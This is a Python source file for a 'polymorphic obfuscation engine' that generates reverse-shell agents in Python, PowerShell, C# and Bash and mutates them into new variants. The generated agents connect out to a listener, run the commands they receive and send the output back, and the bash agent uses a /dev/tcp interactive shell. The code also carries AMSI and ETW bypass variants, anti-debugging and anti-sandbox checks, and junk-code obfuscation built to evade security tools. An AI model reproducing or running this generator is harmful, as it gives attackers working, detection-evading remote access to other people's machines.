#!/usr/bin/env python3
"""
Polymorphic Obfuscation Engine
Advanced polymorphic code transformation and obfuscation techniques
"""

import base64
import random
import string
import hashlib
import binascii
from typing import List, Dict, Tuple
import re


class PolymorphicObfuscator:
    """
    Professional polymorphic obfuscation engine
    Generates unique code variants on each execution
    """
    
    def __init__(self, obfuscation_level='high'):
        """
        Initialize polymorphic obfuscator
        
        Args:
            obfuscation_level: 'low', 'medium', 'high', 'extreme'
        """
        self.obfuscation_level = obfuscation_level
        self.used_names = set()
        self.encoding_methods = [
            'base64', 'hex', 'rot13', 'xor', 'reverse_base64',
            'custom_alphabet', 'chunk_encoding'
        ]
        
    def generate_unique_name(self, prefix='', length=None):
        """Generate unique variable/function name"""
        if length is None:
            length = random.randint(8, 16) if self.obfuscation_level in ['high', 'extreme'] else random.randint(6, 10)
        
        strategies = [
            self._generate_readable_name,
            self._generate_random_name,
            self._generate_mixed_case_name,
            self._generate_underscore_name
        ]
        
        for _ in range(100):  # Try up to 100 times
            name = random.choice(strategies)(prefix, length)
            if name not in self.used_names:
                self.used_names.add(name)
                return name
        
        # Fallback
        return f"{prefix}{random.randint(10000, 99999)}"
    
    def _generate_readable_name(self, prefix, length):
        """Generate readable-looking name"""
        consonants = 'bcdfghjklmnpqrstvwxz'
        vowels = 'aeiou'
        name = prefix
        
        for i in range(length - len(prefix)):
            if i % 2 == 0:
                name += random.choice(consonants)
            else:
                name += random.choice(vowels)
        
        return name
    
    def _generate_random_name(self, prefix, length):
        """Generate random alphanumeric name"""
        chars = string.ascii_lowercase + string.digits
        return prefix + ''.join(random.choices(chars, k=length - len(prefix)))
    
    def _generate_mixed_case_name(self, prefix, length):
        """Generate mixed case name"""
        chars = string.ascii_letters + string.digits
        return prefix + ''.join(random.choices(chars, k=length - len(prefix)))
    
    def _generate_underscore_name(self, prefix, length):
        """Generate name with underscores"""
        segments = random.randint(2, 4)
        remaining = length - len(prefix)
        segment_length = remaining // segments
        
        name = prefix
        for i in range(segments):
            name += ''.join(random.choices(string.ascii_lowercase, k=segment_length))
            if i < segments - 1:
                name += '_'
        
        return name[:length]
    
    def obfuscate_python(self, code, lhost, lport):
        """
        Apply polymorphic obfuscation to Python code
        
        Args:
            code: Original Python code
            lhost: Listener host
            lport: Listener port
        
        Returns:
            Dict with obfuscated code and metadata
        """
        
        # Generate random names
        var_names = {
            'socket': self.generate_unique_name('s'),
            'subprocess': self.generate_unique_name('sp'),
            'base64': self.generate_unique_name('b'),
            'sys': self.generate_unique_name('sy'),
            'os': self.generate_unique_name('o'),
            'time': self.generate_unique_name('t'),
            'main_func': self.generate_unique_name('main'),
            'encrypt_func': self.generate_unique_name('enc'),
            'decrypt_func': self.generate_unique_name('dec'),
            'connect_func': self.generate_unique_name('conn'),
            'execute_func': self.generate_unique_name('exec'),
            'cmd_var': self.generate_unique_name('c'),
            'output_var': self.generate_unique_name('out'),
            'data_var': self.generate_unique_name('d'),
            'key_var': self.generate_unique_name('k'),
            'result_var': self.generate_unique_name('res')
        }
        
        # Encode strings polymorphically
        encoded_host = self._polymorphic_string_encode(lhost)
        encoded_key = self._polymorphic_string_encode(self._generate_random_key())
        
        # Select random encryption method
        encryption_method = random.choice(['xor', 'xor_multi', 'rotate', 'substitute'])
        
        # Generate dead code functions
        dead_code_funcs = self._generate_dead_code_functions(3)
        
        # Build obfuscated agent
        obfuscated_code = self._build_python_agent(
            var_names, 
            encoded_host, 
            lport, 
            encoded_key,
            encryption_method,
            dead_code_funcs
        )
        
        # Apply additional transformations based on level
        if self.obfuscation_level == 'extreme':
            obfuscated_code = self._apply_extreme_obfuscation_python(obfuscated_code)
        
        return {
            'code': obfuscated_code,
            'language': 'python',
            'obfuscation_level': self.obfuscation_level,
            'encryption_method': encryption_method,
            'techniques': [
                'Polymorphic variable names',
                'String encoding',
                f'{encryption_method.upper()} encryption',
                'Dead code injection',
                'Control flow obfuscation'
            ]
        }
    
    def obfuscate_powershell(self, lhost, lport):
        """
        Generate polymorphic obfuscated PowerShell agent
        """
        
        # Generate random names
        var_names = {
            'client': self.generate_unique_name('cl'),
            'stream': self.generate_unique_name('st'),
            'buffer': self.generate_unique_name('buf'),
            'data': self.generate_unique_name('dt'),
            'result': self.generate_unique_name('rs'),
            'command': self.generate_unique_name('cmd'),
            'connect_func': self.generate_unique_name('Conn'),
            'execute_func': self.generate_unique_name('Exec'),
            'encode_func': self.generate_unique_name('Enc'),
            'decode_func': self.generate_unique_name('Dec'),
            'amsi_bypass_var1': self.generate_unique_name('ab'),
            'amsi_bypass_var2': self.generate_unique_name('af')
        }
        
        # Encode critical strings
        encoded_host = self._polymorphic_string_encode_powershell(lhost)
        amsi_string = self._polymorphic_string_encode_powershell('AmsiUtils')
        amsi_field = self._polymorphic_string_encode_powershell('amsiInitFailed')
        
        # Generate AMSI bypass variations
        amsi_bypass = self._generate_amsi_bypass_variant()
        
        # Build agent
        obfuscated_code = self._build_powershell_agent(
            var_names,
            encoded_host,
            lport,
            amsi_bypass
        )
        
        # Apply PowerShell-specific obfuscation
        obfuscated_code = self._obfuscate_powershell_syntax(obfuscated_code)
        
        return {
            'code': obfuscated_code,
            'language': 'powershell',
            'obfuscation_level': self.obfuscation_level,
            'techniques': [
                'Polymorphic AMSI bypass',
                'Variable name randomization',
                'String obfuscation',
                'Command obfuscation',
                'Control flow randomization'
            ]
        }
    
    def obfuscate_csharp(self, lhost, lport):
        """
        Generate polymorphic obfuscated C# agent
        """
        
        # Generate random names
        namespace_name = self.generate_unique_name('NS', 12)
        class_name = self.generate_unique_name('CL', 12)
        
        var_names = {
            'namespace': namespace_name,
            'class': class_name,
            'main_method': 'Main',
            'connect_method': self.generate_unique_name('Connect'),
            'execute_method': self.generate_unique_name('Execute'),
            'encrypt_method': self.generate_unique_name('Encrypt'),
            'decrypt_method': self.generate_unique_name('Decrypt'),
            'antisandbox_method': self.generate_unique_name('AntiSandbox'),
            'client_var': self.generate_unique_name('client'),
            'stream_var': self.generate_unique_name('stream'),
            'buffer_var': self.generate_unique_name('buffer'),
            'key_var': self.generate_unique_name('key'),
            'data_var': self.generate_unique_name('data'),
            'result_var': self.generate_unique_name('result')
        }
        
        # Encode strings
        encoded_host = self._polymorphic_string_encode(lhost)
        encoded_key = self._generate_random_key()
        
        # Build agent
        obfuscated_code = self._build_csharp_agent(
            var_names,
            encoded_host,
            lport,
            encoded_key
        )
        
        return {
            'code': obfuscated_code,
            'language': 'csharp',
            'namespace': namespace_name,
            'class': class_name,
            'obfuscation_level': self.obfuscation_level,
            'compile_command': f'csc /target:exe /out:{class_name}.exe /optimize+ {class_name}.cs',
            'techniques': [
                'Anti-debugging',
                'Anti-sandboxing',
                'String encryption',
                'Polymorphic structure',
                'Random timing delays'
            ]
        }
    
    def obfuscate_bash(self, lhost, lport):
        """
        Generate polymorphic obfuscated Bash agent
        """
        
        # Encoding methods for bash
        encoding = random.choice(['base64', 'hex', 'octal'])
        
        # Generate random variable names
        var_names = {
            'host': self.generate_unique_name('h'),
            'port': self.generate_unique_name('p'),
            'cmd': self.generate_unique_name('c'),
            'output': self.generate_unique_name('o'),
            'socket': self.generate_unique_name('s')
        }
        
        obfuscated_code = self._build_bash_agent(
            var_names,
            lhost,
            lport,
            encoding
        )
        
        return {
            'code': obfuscated_code,
            'language': 'bash',
            'obfuscation_level': self.obfuscation_level,
            'encoding': encoding,
            'techniques': [
                f'{encoding.upper()} encoding',
                'Variable randomization',
                'Command obfuscation',
                'Process hiding'
            ]
        }
    
    # ===== Python Agent Builder =====
    
    def _build_python_agent(self, var_names, encoded_host, lport, encoded_key, encryption_method, dead_code):
        """Build polymorphic Python agent"""
        
        # Decrypt host function
        decrypt_host_code = self._get_string_decrypt_code(encoded_host)
        
        # Encryption functions based on method
        if encryption_method == 'xor':
            encrypt_decrypt_funcs = self._generate_xor_functions(var_names)
        elif encryption_method == 'xor_multi':
            encrypt_decrypt_funcs = self._generate_multi_xor_functions(var_names)
        elif encryption_method == 'rotate':
            encrypt_decrypt_funcs = self._generate_rotate_functions(var_names)
        else:
            encrypt_decrypt_funcs = self._generate_substitute_functions(var_names)
        
        # Randomize import order
        imports = [
            f"import {var_names['socket']} as socket",
            f"import {var_names['subprocess']} as subprocess",
            f"import {var_names['base64']} as base64",
            f"import {var_names['sys']} as sys",
            f"import {var_names['os']} as os",
            f"import {var_names['time']} as time"
        ]
        random.shuffle(imports)
        
        # Build agent code
        code = f'''#!/usr/bin/env python3
# Polymorphic Agent - Generated {hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}

{chr(10).join(imports)}

{dead_code}

{encrypt_decrypt_funcs}

def {var_names['connect_func']}():
    """{self._generate_random_docstring()}"""
    {var_names['data_var']} = {decrypt_host_code}
    {var_names['key_var']} = {self._get_string_decrypt_code(encoded_key)}
    
    while True:
        try:
            {var_names['socket']} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            {var_names['socket']}.connect(({var_names['data_var']}, {lport}))
            
            while True:
                {var_names['cmd_var']} = {var_names['socket']}.recv(4096)
                if not {var_names['cmd_var']}:
                    break
                
                # Decrypt command
                {var_names['cmd_var']} = {var_names['decrypt_func']}({var_names['cmd_var']}, {var_names['key_var']})
                
                if {var_names['cmd_var']}.lower().strip() == 'exit':
                    break
                
                try:
                    {var_names['output_var']} = subprocess.check_output(
                        {var_names['cmd_var']},
                        shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                except subprocess.TimeoutExpired:
                    {var_names['output_var']} = b"Command timeout"
                except Exception as {var_names['result_var']}:
                    {var_names['output_var']} = str({var_names['result_var']}).encode()
                
                # Encrypt output
                {var_names['output_var']} = {var_names['encrypt_func']}({var_names['output_var']}, {var_names['key_var']})
                {var_names['socket']}.sendall({var_names['output_var']})
            
            {var_names['socket']}.close()
            break
            
        except Exception:
            time.sleep({random.randint(20, 40)})
            continue

if __name__ == "__main__":
    # Anti-debugging
    if os.getenv('{self.generate_unique_name("DEBUG")}'):
        sys.exit(0)
    
    {var_names['connect_func']}()
'''
        
        return code
    
    def _generate_xor_functions(self, var_names):
        """Generate XOR encryption/decryption functions"""
        return f'''
def {var_names['encrypt_func']}({var_names['data_var']}, {var_names['key_var']}=b"default"):
    """{self._generate_random_docstring()}"""
    if isinstance({var_names['data_var']}, str):
        {var_names['data_var']} = {var_names['data_var']}.encode('utf-8', errors='replace')
    if isinstance({var_names['key_var']}, str):
        {var_names['key_var']} = {var_names['key_var']}.encode('utf-8', errors='replace')
    
    {var_names['result_var']} = bytearray()
    for {var_names['socket']} in range(len({var_names['data_var']})):
        {var_names['result_var']}.append({var_names['data_var']}[{var_names['socket']}] ^ {var_names['key_var']}[{var_names['socket']} % len({var_names['key_var']})])
    return bytes({var_names['result_var']})

def {var_names['decrypt_func']}({var_names['data_var']}, {var_names['key_var']}=b"default"):
    """{self._generate_random_docstring()}"""
    {var_names['result_var']} = {var_names['encrypt_func']}({var_names['data_var']}, {var_names['key_var']})
    try:
        return {var_names['result_var']}.decode('utf-8', errors='replace')
    except:
        return {var_names['result_var']}
'''
    
    def _generate_multi_xor_functions(self, var_names):
        """Generate multi-pass XOR encryption"""
        passes = random.randint(2, 4)
        return f'''
def {var_names['encrypt_func']}({var_names['data_var']}, {var_names['key_var']}=b"default"):
    """{self._generate_random_docstring()}"""
    if isinstance({var_names['data_var']}, str):
        {var_names['data_var']} = {var_names['data_var']}.encode('utf-8', errors='replace')
    if isinstance({var_names['key_var']}, str):
        {var_names['key_var']} = {var_names['key_var']}.encode('utf-8', errors='replace')
    
    {var_names['result_var']} = {var_names['data_var']}
    for _ in range({passes}):
        {var_names['output_var']} = bytearray()
        for {var_names['socket']} in range(len({var_names['result_var']})):
            {var_names['output_var']}.append({var_names['result_var']}[{var_names['socket']}] ^ {var_names['key_var']}[{var_names['socket']} % len({var_names['key_var']})])
        {var_names['result_var']} = bytes({var_names['output_var']})
    
    return {var_names['result_var']}

def {var_names['decrypt_func']}({var_names['data_var']}, {var_names['key_var']}=b"default"):
    """{self._generate_random_docstring()}"""
    {var_names['result_var']} = {var_names['encrypt_func']}({var_names['data_var']}, {var_names['key_var']})
    try:
        return {var_names['result_var']}.decode('utf-8', errors='replace')
    except:
        return {var_names['result_var']}
'''
    
    def _generate_rotate_functions(self, var_names):
        """Generate rotation-based encryption"""
        rotation = random.randint(1, 255)
        return f'''
def {var_names['encrypt_func']}({var_names['data_var']}, {var_names['key_var']}=b"default"):
    """{self._generate_random_docstring()}"""
    if isinstance({var_names['data_var']}, str):
        {var_names['data_var']} = {var_names['data_var']}.encode('utf-8', errors='replace')
    
    {var_names['result_var']} = bytearray()
    for {var_names['socket']} in {var_names['data_var']}:
        {var_names['result_var']}.append(({var_names['socket']} + {rotation}) % 256)
    return bytes({var_names['result_var']})

def {var_names['decrypt_func']}({var_names['data_var']}, {var_names['key_var']}=b"default"):
    """{self._generate_random_docstring()}"""
    if isinstance({var_names['data_var']}, bytes):
        {var_names['result_var']} = bytearray()
        for {var_names['socket']} in {var_names['data_var']}:
            {var_names['result_var']}.append(({var_names['socket']} - {rotation}) % 256)
        {var_names['data_var']} = bytes({var_names['result_var']})
    
    try:
        return {var_names['data_var']}.decode('utf-8', errors='replace')
    except:
        return {var_names['data_var']}
'''
    
    def _generate_substitute_functions(self, var_names):
        """Generate substitution cipher"""
        return f'''
def {var_names['encrypt_func']}({var_names['data_var']}, {var_names['key_var']}=b"default"):
    """{self._generate_random_docstring()}"""
    if isinstance({var_names['data_var']}, str):
        {var_names['data_var']} = {var_names['data_var']}.encode('utf-8', errors='replace')
    
    {var_names['result_var']} = bytearray()
    for {var_names['socket']}, {var_names['cmd_var']} in enumerate({var_names['data_var']}):
        {var_names['result_var']}.append({var_names['cmd_var']} ^ ({var_names['socket']} % 256))
    return bytes({var_names['result_var']})

def {var_names['decrypt_func']}({var_names['data_var']}, {var_names['key_var']}=b"default"):
    """{self._generate_random_docstring()}"""
    if isinstance({var_names['data_var']}, bytes):
        {var_names['result_var']} = bytearray()
        for {var_names['socket']}, {var_names['cmd_var']} in enumerate({var_names['data_var']}):
            {var_names['result_var']}.append({var_names['cmd_var']} ^ ({var_names['socket']} % 256))
        {var_names['data_var']} = bytes({var_names['result_var']})
    
    try:
        return {var_names['data_var']}.decode('utf-8', errors='replace')
    except:
        return {var_names['data_var']}
'''
    
    # ===== PowerShell Agent Builder =====
    
    def _build_powershell_agent(self, var_names, encoded_host, lport, amsi_bypass):
        """Build polymorphic PowerShell agent"""
        
        code = f'''# Polymorphic PowerShell Agent
$ErrorActionPreference = "SilentlyContinue"

{amsi_bypass}

function {var_names['encode_func']} {{
    param([string]${var_names['data']})
    ${var_names['result']} = [System.Text.Encoding]::UTF8.GetBytes(${var_names['data']})
    return ${var_names['result']}
}}

function {var_names['decode_func']} {{
    param([byte[]]${var_names['data']})
    ${var_names['result']} = [System.Text.Encoding]::UTF8.GetString(${var_names['data']})
    return ${var_names['result']}
}}

function {var_names['connect_func']} {{
    param([string]${var_names['client']}, [int]${var_names['stream']})
    
    while ($true) {{
        try {{
            ${var_names['buffer']} = New-Object System.Net.Sockets.TCPClient({encoded_host}, {lport})
            ${var_names['data']} = ${var_names['buffer']}.GetStream()
            
            [byte[]]${var_names['result']} = 0..65535|%{{0}}
            
            while ((${var_names['command']} = ${var_names['data']}.Read(${var_names['result']}, 0, ${var_names['result']}.Length)) -ne 0) {{
                ${var_names['execute_func']} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${var_names['result']}, 0, ${var_names['command']})
                
                if (${var_names['execute_func']}.Trim().ToLower() -eq "exit") {{
                    break
                }}
                
                try {{
                    ${var_names['result']} = (Invoke-Expression ${var_names['execute_func']} 2>&1 | Out-String)
                }} catch {{
                    ${var_names['result']} = $_.Exception.Message
                }}
                
                ${var_names['result']} = ${var_names['result']} + "PS " + (Get-Location).Path + "> "
                ${var_names['command']} = ([text.encoding]::ASCII).GetBytes(${var_names['result']})
                ${var_names['data']}.Write(${var_names['command']}, 0, ${var_names['command']}.Length)
                ${var_names['data']}.Flush()
            }}
            
            ${var_names['data']}.Close()
            ${var_names['buffer']}.Close()
            break
            
        }} catch {{
            Start-Sleep -Seconds {random.randint(20, 40)}
            continue
        }}
    }}
}}

# Execute
{var_names['connect_func']} "{encoded_host}" {lport}
'''
        
        return code
    
    def _generate_amsi_bypass_variant(self):
        """Generate randomized AMSI bypass"""
        variants = [
            # Variant 1: Reflection
            f"""
${self.generate_unique_name()} = [Ref].Assembly.GetType('{self._obfuscate_string("System.Management.Automation.AmsiUtils")}')
${self.generate_unique_name()} = ${self.generate_unique_name()}.GetField('{self._obfuscate_string("amsiInitFailed")}','NonPublic,Static')
${self.generate_unique_name()}.SetValue($null,$true)
""",
            # Variant 2: Memory patch
            f"""
${self.generate_unique_name()} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType('{self._obfuscate_string("System.Management.Automation.AmsiUtils")}').GetField('{self._obfuscate_string("amsiContext")}','NonPublic,Static').SetValue($null, ${self.generate_unique_name()})
""",
            # Variant 3: Simple bypass
            f"""
[Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('{self._obfuscate_string("System.Management.Automation.Tracing.PSEtwLogProvider")}').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
"""
        ]
        
        return random.choice(variants)
    
    # ===== C# Agent Builder =====
    
    def _build_csharp_agent(self, var_names, encoded_host, lport, encoded_key):
        """Build polymorphic C# agent"""
        
        decode_host = self._get_string_decrypt_code(encoded_host)
        
        code = f'''using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

namespace {var_names['namespace']}
{{
    class {var_names['class']}
    {{
        private static string {var_names['client_var']} = {decode_host};
        private static int {var_names['stream_var']} = {lport};
        private static byte[] {var_names['key_var']} = Encoding.UTF8.GetBytes("{encoded_key}");

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {{
            // Anti-debugging checks
            if ({var_names['antisandbox_method']}())
                return;

            // Random delay
            Thread.Sleep(new Random().Next({random.randint(2000, 8000)}, {random.randint(8000, 15000)}));

            // Connect with retry
            int retries = 0;
            while (retries < {random.randint(3, 7)})
            {{
                try
                {{
                    {var_names['connect_method']}();
                    break;
                }}
                catch
                {{
                    Thread.Sleep({random.randint(20000, 40000)});
                    retries++;
                }}
            }}
        }}

        static bool {var_names['antisandbox_method']}()
        {{
            // Check for debugger
            if (Debugger.IsAttached)
                return true;

            // Check for common sandbox artifacts
            if (GetModuleHandle("SbieDll.dll") != IntPtr.Zero)
                return true;

            if (GetModuleHandle("snxhk.dll") != IntPtr.Zero)
                return true;

            // Timing check
            DateTime start = DateTime.Now;
            Thread.Sleep(1000);
            if ((DateTime.Now - start).TotalMilliseconds < 900)
                return true;

            return false;
        }}

        static void {var_names['connect_method']}()
        {{
            using (TcpClient {var_names['client_var']} = new TcpClient({var_names['client_var']}, {var_names['stream_var']}))
            using (NetworkStream {var_names['stream_var']} = {var_names['client_var']}.GetStream())
            {{
                byte[] {var_names['buffer_var']} = new byte[8192];
                int {var_names['data_var']};

                while (({var_names['data_var']} = {var_names['stream_var']}.Read({var_names['buffer_var']}, 0, {var_names['buffer_var']}.Length)) != 0)
                {{
                    byte[] {var_names['encrypt_method']} = new byte[{var_names['data_var']}];
                    Array.Copy({var_names['buffer_var']}, {var_names['encrypt_method']}, {var_names['data_var']});
                    
                    string command = {var_names['decrypt_method']}({var_names['encrypt_method']});

                    if (command.ToLower().Trim() == "exit")
                        break;

                    string result = {var_names['execute_method']}(command);
                    
                    byte[] {var_names['result_var']} = {var_names['encrypt_method']}(result);
                    {var_names['stream_var']}.Write({var_names['result_var']}, 0, {var_names['result_var']}.Length);
                }}
            }}
        }}

        static string {var_names['execute_method']}(string command)
        {{
            try
            {{
                ProcessStartInfo psi = new ProcessStartInfo()
                {{
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = Environment.CurrentDirectory
                }};

                using (Process proc = Process.Start(psi))
                {{
                    string output = proc.StandardOutput.ReadToEnd();
                    string errors = proc.StandardError.ReadToEnd();
                    proc.WaitForExit(30000);
                    return output + errors;
                }}
            }}
            catch (Exception ex)
            {{
                return "Error: " + ex.Message;
            }}
        }}

        static byte[] {var_names['encrypt_method']}(string data)
        {{
            byte[] dataBytes = Encoding.UTF8.GetBytes(data);
            byte[] result = new byte[dataBytes.Length];
            
            for (int i = 0; i < dataBytes.Length; i++)
            {{
                result[i] = (byte)(dataBytes[i] ^ {var_names['key_var']}[i % {var_names['key_var']}.Length]);
            }}
            
            return result;
        }}

        static string {var_names['decrypt_method']}(byte[] data)
        {{
            byte[] result = new byte[data.Length];
            
            for (int i = 0; i < data.Length; i++)
            {{
                result[i] = (byte)(data[i] ^ {var_names['key_var']}[i % {var_names['key_var']}.Length]);
            }}
            
            return Encoding.UTF8.GetString(result);
        }}
    }}
}}
'''
        
        return code
    
    # ===== Bash Agent Builder =====
    
    def _build_bash_agent(self, var_names, lhost, lport, encoding):
        """Build polymorphic Bash agent"""
        
        if encoding == 'base64':
            encoded_host = base64.b64encode(lhost.encode()).decode()
            decode_cmd = f"echo {encoded_host} | base64 -d"
        elif encoding == 'hex':
            encoded_host = lhost.encode().hex()
            decode_cmd = f"echo {encoded_host} | xxd -r -p"
        else:  # octal
            encoded_host = ''.join(f'\\\\{ord(c):03o}' for c in lhost)
            decode_cmd = f"echo -e '{encoded_host}'"
        
        code = f'''#!/bin/bash
# Polymorphic Bash Agent

{var_names['host']}=$({decode_cmd})
{var_names['port']}={lport}

while true; do
    bash -i >& /dev/tcp/${{{var_names['host']}}}/${{{var_names['port']}}} 0>&1
    sleep {random.randint(20, 40)}
done
'''
        
        return code
    
    # ===== Helper Functions =====
    
    def _polymorphic_string_encode(self, text):
        """Encode string polymorphically"""
        method = random.choice(self.encoding_methods)
        
        if method == 'base64':
            return f'base64.b64decode("{base64.b64encode(text.encode()).decode()}").decode()'
        elif method == 'hex':
            return f'bytes.fromhex("{text.encode().hex()}").decode()'
        elif method == 'rot13':
            rot13 = text.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
            ))
            return f'"{rot13}".translate(str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))'
        elif method == 'reverse_base64':
            reversed_text = text[::-1]
            return f'base64.b64decode("{base64.b64encode(reversed_text.encode()).decode()}").decode()[::-1]'
        else:
            return f'"{text}"'
    
    def _polymorphic_string_encode_powershell(self, text):
        """Encode string for PowerShell"""
        method = random.choice(['base64', 'join', 'format'])
        
        if method == 'base64':
            encoded = base64.b64encode(text.encode('utf-16le')).decode()
            return f'[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("{encoded}"))'
        elif method == 'join':
            chars = ','.join(f"'{c}'" for c in text)
            return f'({chars} -join "")'
        else:
            return f'"{text}"'
    
    def _obfuscate_string(self, text):
        """Simple string obfuscation"""
        result = ''
        for char in text:
            if random.random() > 0.3:
                result += char
            else:
                result += f'{{({ord(char)})}}'.replace('{', '$').replace('}', '')
        return result
    
    def _get_string_decrypt_code(self, encoded_expression):
        """Get decryption code that's already embedded in expression"""
        return encoded_expression
    
    def _generate_random_key(self):
        """Generate random encryption key"""
        length = random.randint(16, 32)
        return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=length))
    
    def _generate_random_docstring(self):
        """Generate random docstring"""
        docstrings = [
            "Process data stream",
            "Handle network communication",
            "Execute system operation",
            "Manage connection state",
            "Perform data transformation",
            "Initialize communication channel",
            "Process incoming requests"
        ]
        return random.choice(docstrings)
    
    def _generate_dead_code_functions(self, count):
        """Generate dead code functions to confuse analysis"""
        functions = []
        
        for _ in range(count):
            func_name = self.generate_unique_name('func')
            param_names = [self.generate_unique_name('p') for _ in range(random.randint(1, 3))]
            
            operations = [
                f"return {param_names[0]} + {random.randint(1, 100)}",
                f"return {param_names[0]} * {random.randint(2, 10)}",
                f"return str({param_names[0]})[::-1]",
                f"return len(str({param_names[0]})) % {random.randint(2, 10)}"
            ]
            
            func = f'''
def {func_name}({', '.join(param_names)}):
    """{self._generate_random_docstring()}"""
    {random.choice(operations)}
'''
            functions.append(func)
        
        return '\n'.join(functions)
    
    def _apply_extreme_obfuscation_python(self, code):
        """Apply extreme obfuscation techniques"""
        # Add junk comments
        lines = code.split('\n')
        for i in range(len(lines)):
            if random.random() > 0.7 and lines[i].strip():
                lines[i] += f"  # {self.generate_unique_name()}"
        
        return '\n'.join(lines)
    
    def _obfuscate_powershell_syntax(self, code):
        """Obfuscate PowerShell syntax"""
        # Random case variations
        if random.random() > 0.5:
            # Randomly change case of cmdlets
            code = re.sub(r'\b(New-Object)\b', lambda m: self._randomize_case(m.group(1)), code)
            code = re.sub(r'\b(Get-Location)\b', lambda m: self._randomize_case(m.group(1)), code)
        
        return code
    
    def _randomize_case(self, text):
        """Randomize case of text"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)


# ===== Agent Mutation Engine =====

class AgentMutator:
    """
    Mutate existing agents to create new variants
    """
    
    def __init__(self):
        self.obfuscator = PolymorphicObfuscator()
    
    def mutate_agent(self, agent_code, language, mutation_rate=0.5):
        """
        Mutate an existing agent
        
        Args:
            agent_code: Original agent code
            language: Programming language
            mutation_rate: How much to mutate (0.0 to 1.0)
        
        Returns:
            Mutated agent code
        """
        
        if language == 'python':
            return self._mutate_python(agent_code, mutation_rate)
        elif language == 'powershell':
            return self._mutate_powershell(agent_code, mutation_rate)
        elif language == 'csharp':
            return self._mutate_csharp(agent_code, mutation_rate)
        else:
            return agent_code
    
    def _mutate_python(self, code, mutation_rate):
        """Mutate Python code"""
        lines = code.split('\n')
        
        for i in range(len(lines)):
            if random.random() < mutation_rate:
                # Add dead code
                if 'def ' in lines[i]:
                    indent = len(lines[i]) - len(lines[i].lstrip())
                    lines[i] += f"\n{' ' * (indent + 4)}_ = {random.randint(1, 1000)}"
        
        return '\n'.join(lines)
    
    def _mutate_powershell(self, code, mutation_rate):
        """Mutate PowerShell code"""
        # Change variable prefixes
        code = code.replace('$', f"${self.obfuscator.generate_unique_name('')}")
        return code
    
    def _mutate_csharp(self, code, mutation_rate):
        """Mutate C# code"""
        lines = code.split('\n')
        
        for i in range(len(lines)):
            if random.random() < mutation_rate and '//' not in lines[i]:
                if lines[i].strip().endswith(';'):
                    lines[i] = lines[i].rstrip(';') + f'; /* {random.randint(1000, 9999)} */'
        
        return '\n'.join(lines)


if __name__ == "__main__":
    # Test polymorphic obfuscation
    print("=== Polymorphic Obfuscation Engine Test ===\n")
    
    obfuscator = PolymorphicObfuscator(obfuscation_level='high')
    
    # Test Python
    print("=== Python Agent ===")
    py_agent = obfuscator.obfuscate_python("", "192.168.1.100", 4444)
    print(f"Techniques: {', '.join(py_agent['techniques'])}")
    print(f"Encryption: {py_agent['encryption_method']}")
    print(f"Code length: {len(py_agent['code'])} bytes\n")
    
    # Test PowerShell
    print("=== PowerShell Agent ===")
    ps_agent = obfuscator.obfuscate_powershell("192.168.1.100", 4444)
    print(f"Techniques: {', '.join(ps_agent['techniques'])}")
    print(f"Code length: {len(ps_agent['code'])} bytes\n")
    
    # Test C#
    print("=== C# Agent ===")
    cs_agent = obfuscator.obfuscate_csharp("192.168.1.100", 4444)
    print(f"Namespace: {cs_agent['namespace']}")
    print(f"Class: {cs_agent['class']}")
    print(f"Techniques: {', '.join(cs_agent['techniques'])}")
    print(f"Code length: {len(cs_agent['code'])} bytes\n")
    
    # Test Bash
    print("=== Bash Agent ===")
    bash_agent = obfuscator.obfuscate_bash("192.168.1.100", 4444)
    print(f"Techniques: {', '.join(bash_agent['techniques'])}")
    print(f"Encoding: {bash_agent['encoding']}\n")
    
    print("=== Polymorphic Generation Complete ===")
